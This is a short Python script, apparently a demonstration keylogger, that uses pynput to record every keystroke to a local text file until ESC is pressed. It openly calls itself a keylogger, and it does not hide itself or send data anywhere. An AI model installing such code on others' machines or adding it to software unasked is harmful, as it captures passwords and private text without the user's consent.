from pynput import keyboard
import os

log_file = "keylog.txt"

# Ensure log file exists
if not os.path.exists(log_file):
    open(log_file, "w").close()

# This function is called whenever a key is pressed
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" [{key.name}] ")

    # Stop listener if ESC is pressed
    if key == keyboard.Key.esc:
        print("ESC pressed, stopping keylogger.")
        return False  # This stops the listener

# Start listening to the keyboard
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
